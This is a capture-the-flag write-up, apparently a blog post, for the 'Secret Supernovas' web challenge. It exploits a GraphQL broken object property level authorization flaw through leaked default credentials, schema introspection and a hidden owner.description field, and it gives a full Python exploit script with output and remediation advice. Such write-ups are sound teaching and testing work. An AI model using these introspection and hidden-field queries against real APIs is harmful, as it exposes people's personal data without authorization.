---
title: '[CSSCTF] Web Exploitation: Secret Supernovas'
date: '2026-10-02'
description: 'Write-up for the "Secret Supernovas" Web challenge in CSSCTF - exploiting GraphQL API authorization flaws (BOPLA) to extract sensitive data.'
categories: [CSSCTF, Web]
tags: [cssctf, web, graphql, api-security, recon]
series: ['CSSCTF 2026']
showAuthor: false
showTableOfContents: true
---

# CTF Write-up: Secret Supernovas

**Competition:** CSSCTF  
**Category:** Web  
**Challenge Name:** Secret Supernovas  
**Flag:** `CSSCTF{we_l000ve_grafs}`  
**Difficulty:** Medium  
**Target:** http://34.116.80.78:9982/

---

## Challenge Description

> This is just a list of stars. Nothing else to see here...

The challenge statement is intentionally understated. In reality, the application serves an astronomical star catalogue backed by an inadequately secured GraphQL API that conceals confidential data.

---

## Step 1: Reconnaissance

### 1.1 Inspecting the Landing Page

Navigating to `http://34.116.80.78:9982/` displays the login interface:

```html
<title>Log in · Star City Observatory</title>
...
<main>
  <h1>Login</h1>
  <form method="POST">
    <label>Username <input name="username" .../></label>
    <label>Password <input name="password" .../></label>
    <button type="submit">Log in</button>
  </form>
  <p class="hint">Need an account? <code>cadet/star</code>.</p>
</main>
```

> [!NOTE]
> The login form explicitly reveals default visitor credentials: `cadet/star`.

**Initial observations:**
- Application name: **Star City Observatory**
- Framework: **SvelteKit** (identified via Svelte SVG logos and compiled client asset structure)
- Form-based authentication with potential role segregation

---

## Step 2: Authentication and Session Analysis

### 2.1 Authenticating as `cadet/star`

```python
import requests

session = requests.Session()

resp = session.post(
    'http://34.116.80.78:9982/login',
    data={'username': 'cadet', 'password': 'star'},
    allow_redirects=False
)
print('Status:', resp.status_code)
# 200
print('Set-Cookie:', resp.headers.get('set-cookie'))
# session=6812e862-...; Max-Age=28800; Path=/; HttpOnly; SameSite=Lax
print('Body:', resp.text)
# {"type":"redirect","status":303,"location":"/"}
```

**Result:** The endpoint responds with JSON redirect instructions rather than an HTTP 303 status code, typical of SvelteKit form actions. A session cookie is established with `HttpOnly; SameSite=Lax`.

### 2.2 Accessing the Authenticated Dashboard

```python
resp2 = session.get('http://34.116.80.78:9982/')
print(resp2.text)
```

The returned HTML includes embedded session details in the client-side bootstrap state:

```javascript
kit.start(app, element, {
    node_ids: [0, 2],
    data: [{
        type: "data",
        data: {
            user: {id: 10, first_name: "Cadet", last_name: "Visitor"}
        },
        uses: {}
    }, ...]
});
```

> [!IMPORTANT]
> The user `cadet` has `id = 10` and name "Cadet Visitor", representing an unprivileged guest profile.

The page initially displays `"Aligning telescope…"`, showing that star records are retrieved **asynchronously** via client-side JavaScript rather than rendered server-side. This points to a dedicated backend API endpoint.

---

## Step 3: JavaScript Bundle Analysis

### 3.1 Inspecting Application Bundles

The SvelteKit entry point enumerates route chunks:

```javascript
// /_app/immutable/entry/app.JEDSD3tx.js
const __vite__mapDeps = (i, m=__vite__mapDeps, d=(m.f||(m.f=[
    "../nodes/0.CKVBBlK7.js",
    "../chunks/DdOvFIKB.js",
    "../chunks/xihTtKlq.js",
    "../assets/0.DXnTN1b8.css",
    "../nodes/1.CTC9N2L_.js",
    "../chunks/CU-I4PXI.js",
    "../nodes/2.C521ycad.js",    // <-- Main page (Stars)
    "../assets/2.Df5bwoDh.css",
    "../nodes/3.BbGUoTEM.js",    // <-- Login page
    "../assets/3.DTxWb2OH.css"
]))) => i.map(i => d[i]);
```

Route mapping:

```javascript
var I = {
    "/":      [-3],   // node 2 = Stars page
    "/login": [-4]    // node 3 = Login page
};
```

### 3.2 Analyzing Node 2 — The Stars Component

Downloading `/_app/immutable/nodes/2.C521ycad.js` reveals the data retrieval logic:

```javascript
m(async () => {
    let e = await (await fetch(`/graphql`, {
        method: `POST`,
        headers: {"content-type": `application/json`},
        body: JSON.stringify({
            query: `query Stars {
              stars { id name spectralClass magnitude classification galaxy { name } }
            `}
        })
    })).json();

    e.errors
        ? a(D, e.errors[0].message, !0)
        : a(E, e.data.stars, !0)
});
```

> [!IMPORTANT]
> **Key Finding:** The client sends queries to a **GraphQL** endpoint at `/graphql`. The query specifies only a partial set of fields (`id name spectralClass magnitude classification galaxy`), leaving open the possibility of unexposed schema fields.

---

## Step 4: GraphQL Exploitation

### 4.1 Schema Introspection

GraphQL features an introspection system allowing clients to query schema definitions. With introspection enabled on the target, the complete schema structure can be recovered:

```python
def gql(query):
    r = session.post(
        'http://34.116.80.78:9982/graphql',
        headers={'content-type': 'application/json'},
        json={'query': query}
    )
    return r.json()

result = gql('''
{
  __schema {
    queryType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        args { name }
      }
    }
  }
}
''')
```

**Extracted Schema:**

```
Query type: Query

=== TYPE: Galaxy ===
  - distanceLy
  - id
  - name
  - stars
  - type

=== TYPE: Person ===
  - date_of_birth
  - description       <-- Suspicious
  - first_name
  - id
  - last_name

=== TYPE: Query ===
  - galaxies
  - galaxy(id: Int)
  - star(id: Int)
  - stars
  - user(id: Int)     <-- Arbitrary user query possible

=== TYPE: Star ===
  - classification
  - galaxy
  - id
  - magnitude
  - name
  - owner             <-- Hidden field not rendered in UI
  - spectralClass
```

> [!WARNING]
> **Identified Flaw:** Type `Star` contains an **`owner`** field returning a `Person` object that is not queried by the frontend. The `Person.description` field may hold sensitive data. This constitutes **Broken Object Property Level Authorization (BOPLA)**.

### 4.2 Querying the Hidden `owner.description` Field

Constructing a query requesting the hidden owner properties:

```python
result = gql('''
query Stars {
  stars {
    id
    name
    spectralClass
    magnitude
    classification
    galaxy { id name distanceLy type }
    owner {
      id
      first_name
      last_name
      date_of_birth
      description    # Field omitted from the UI query
    }
  }
}
''')
```

### 4.3 Result — Flag Discovered

Extract from the GraphQL response:

```json
{
  "data": {
    "stars": [
      {
        "id": 1, "name": "Arrowhead",
        "owner": {
          "id": 2, "first_name": "Felicity", "last_name": "Smoak",
          "date_of_birth": "1989-07-24",
          "description": "Systems lead. Keeps the telescope array online."
        }
      },
      {
        "id": 2, "name": "Overwatch",
        "owner": { "id": 2, "first_name": "Felicity", ... }
      },
      {
        "id": 3, "name": "Spartan",
        "owner": {
          "id": 3, "first_name": "John", "last_name": "Diggle",
          "description": "Security. Escorts visitors during night sessions."
        }
      },
      {
        "id": 4, "name": "Speedy",
        "owner": {
          "id": 4, "first_name": "Thea", "last_name": "Queen",
          "description": "Junior astronomer. Logged the Speedy transit in June."
        }
      },
      {
        "id": 5, "name": "Black Canary",
        "spectralClass": "B3V",
        "magnitude": 2.12,
        "classification": "main sequence",
        "galaxy": { "name": "Triangulum" },
        "owner": {
          "id": 5,
          "first_name": "Laurel",
          "last_name": "Lance",
          "date_of_birth": "1986-03-09",
          "description": "CSSCTF{we_l000ve_grafs}"   // FLAG
        }
      },
      ...
      {
        "id": 11, "name": "Secret Supernova",
        "spectralClass": "SN Ia",
        "magnitude": -19.3,
        "classification": "supernova",
        "owner": {
          "id": 1, "first_name": "Oliver", "last_name": "Queen",
          "description": "Observatory Director. Approves all new catalogue entries."
        }
      }
    ]
  }
}
```

> [!NOTE]
> Star entry #11 is named **"Secret Supernova"**, referencing the challenge title. It is owned by Oliver Queen (Observatory Director), while the flag is embedded within the description of **Laurel Lance**, owner of "Black Canary".

---

## Flag

```
CSSCTF{we_l000ve_grafs}
```

---

## Attack Flowchart

```
[Browser / Exploit Script]
        |
        v
[GET /]  -->  Login page (discloses credentials: cadet/star)
        |
        v
[POST /login]  -->  Session cookie issued
        |
        v
[GET /]  -->  Stars dashboard (data loaded asynchronously via JS)
        |
        v
[JavaScript Bundle Analysis]
        |
        +--> /nodes/2.C521ycad.js  -->  fetch('/graphql', ...)
        |                                       |
        v                                       v
[GET /graphql  __schema introspection]   [Hidden fields identified]
        |
        v
[POST /graphql  stars { owner { description } }]
        |
        v
[Flag retrieved from Laurel Lance description]
CSSCTF{we_l000ve_grafs}
```

---

## Vulnerability Analysis

### Vulnerability Classification: BOPLA and Schema Exposure

**OWASP API3:2023 — Broken Object Property Level Authorization**

| Metric | Details |
|--------|---------|
| **Vector** | GraphQL field `owner.description` lacks property-level access enforcement |
| **Prerequisites** | Low-privilege authenticated session (`cadet` visitor account) |
| **Exposed Data** | Sensitive attributes within the `Person` type (`description`) |
| **Root Cause** | Frontend requests only a safe subset of properties, but backend schema does not validate field-level permissions |

### Root Causes

1. **Client-side filtering assumption**: The UI only queries `stars { id name spectralClass magnitude classification galaxy { name } }`, omitting `owner`.
2. **Missing field-level authorization**: Authenticated users can request `owner { description }` without restriction.
3. **Active GraphQL Introspection**: Introspection enabled in production allows attackers to enumerate the complete data schema.

### Remediation

```javascript
// Example remediation using graphql-shield (Node.js)
const permissions = shield({
    Query: {
        stars: isAuthenticated,
    },
    Star: {
        owner: isAdmin,         // Restrict owner field to administrators
    },
    Person: {
        description: isOwnerOrAdmin,  // Only owner or admin can read description
        date_of_birth: isOwnerOrAdmin,
    }
});

// Disable schema introspection in production environments:
const server = new ApolloServer({
    introspection: process.env.NODE_ENV !== 'production',
});
```

---

## Complete Exploit Script

```python
#!/usr/bin/env python3
"""
CTF Write-up: Secret Supernovas
Target: http://34.116.80.78:9982/
Vulnerability: GraphQL BOPLA (Broken Object Property Level Authorization)
Flag: CSSCTF{we_l000ve_grafs}
"""

import requests
import json
import sys

sys.stdout.reconfigure(encoding='utf-8')

TARGET = 'http://34.116.80.78:9982'
session = requests.Session()


def login(username: str, password: str) -> bool:
    """Log in and store session cookie."""
    resp = session.post(
        f'{TARGET}/login',
        data={'username': username, 'password': password},
        allow_redirects=False
    )
    return resp.status_code == 200


def gql(query: str) -> dict:
    """Send GraphQL query."""
    r = session.post(
        f'{TARGET}/graphql',
        headers={'content-type': 'application/json'},
        json={'query': query}
    )
    return r.json()


def get_schema() -> None:
    """Introspect GraphQL schema to discover hidden fields."""
    result = gql('''
    {
      __schema {
        types {
          name kind
          fields(includeDeprecated: true) {
            name
            args { name }
          }
        }
      }
    }
    ''')
    types = result['data']['__schema']['types']
    for t in types:
        if not t['name'].startswith('__') and t.get('fields'):
            print(f"\nType: {t['name']}")
            for f in t['fields']:
                args = ', '.join(a['name'] for a in f.get('args', []))
                print(f"  - {f['name']}" + (f"({args})" if args else ''))


def find_flag() -> str:
    """Exploit the owner.description field to retrieve the flag."""
    result = gql('''
    query Stars {
      stars {
        id name
        owner {
          id first_name last_name
          date_of_birth
          description
        }
      }
    }
    ''')

    for star in result['data']['stars']:
        desc = star['owner']['description']
        if 'CSSCTF{' in desc:
            print(f"[+] Flag found in star '{star['name']}' "
                  f"owned by {star['owner']['first_name']} {star['owner']['last_name']}!")
            return desc
    return None


def main():
    print("[*] Step 1: Login with leaked credentials cadet/star")
    if login('cadet', 'star'):
        print(f"[+] Logged in! Session: {dict(session.cookies)}")
    else:
        print("[-] Login failed")
        return

    print("\n[*] Step 2: GraphQL Introspection - finding hidden fields")
    get_schema()

    print("\n[*] Step 3: Exploiting hidden owner.description field")
    flag = find_flag()

    if flag:
        print(f"\n{'='*50}")
        print(f"FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print("[-] Flag not found")


if __name__ == '__main__':
    main()
```

**Execution Output:**

```
[*] Step 1: Login with leaked credentials cadet/star
[+] Logged in! Session: {'session': '832cdb89-...'}

[*] Step 2: GraphQL Introspection - finding hidden fields

Type: Galaxy
  - distanceLy
  - id
  - name
  - stars
  - type

Type: Person
  - date_of_birth
  - description
  - first_name
  - id
  - last_name

Type: Query
  - galaxies
  - galaxy(id)
  - star(id)
  - stars
  - user(id)

Type: Star
  - classification
  - galaxy
  - id
  - magnitude
  - name
  - owner          <-- Hidden field!
  - spectralClass

[*] Step 3: Exploiting hidden owner.description field
[+] Flag found in star 'Black Canary' owned by Laurel Lance!

==================================================
FLAG: CSSCTF{we_l000ve_grafs}
==================================================
```

---

## Key Takeaways

1. **Never rely on frontend filtering for sensitive data isolation**: Any data exposed by GraphQL types can be queried regardless of whether UI views render it.
2. **Disable GraphQL introspection in production**: Open introspection reveals the schema architecture and assists attackers in locating unexposed fields.
3. **Implement property-level authorization**: Secure individual schema fields and nested types, not merely top-level operations.
4. **Eliminate exposed credentials from client code and markup**: Even low-privilege demo accounts provide an initial foothold for authorized API exploration.
5. **Analyze client JavaScript bundles during assessments**: Single-page application bundles often disclose unpublished API paths and operational logic.
